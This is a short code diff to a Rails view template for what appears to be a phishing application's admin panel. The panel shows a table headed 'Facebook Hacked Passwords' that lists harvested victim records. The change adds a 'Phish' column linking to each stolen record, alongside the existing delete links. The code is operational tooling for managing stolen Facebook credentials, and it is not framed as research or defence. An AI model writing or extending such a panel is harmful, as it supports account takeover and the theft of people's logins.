@@ -5,7 +5,7 @@
 <table align="center">
   <thead>
   <tr>
-    <td style="border: groove;width: 12cm;background-color: forestgreen;color: black" align="center" colspan="10"><h1 align="center">Facebook Hacked Passwords</h1></td>
+    <td style="border: groove;width: 12cm;background-color: forestgreen;color: black" align="center" colspan="11"><h1 align="center">Facebook Hacked Passwords</h1></td>
   </tr>
   <tr style="border: groove">
 
@@ -19,6 +19,7 @@
     <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Gender</td>
     <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Received at</td>
     <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Delete</td>
+    <td style="border: groove;width: 6cm;height: 1cm;background-color: forestgreen;color: white" align="center">Phish</td>
   </tr>
   </thead>
 
@@ -35,6 +36,7 @@
         <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= fb.gender %></td>
         <td style="border: groove;width: 6.5cm;height: 0.5cm" align="center">Date: <%=fb.created_at.strftime("%d %b. %Y")%>, Time: <%= fb.created_at.strftime("%I:%M %p")%></td>
         <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= link_to 'Destroy', fb, method: :delete, data: { confirm: 'Are you sure?' } %></td>
+        <td style="border: groove;width: 6cm;height: 0.5cm" align="center" ><%= link_to 'Phish', fb %></td>
       </tr>
   <% end %>
   </tbody>
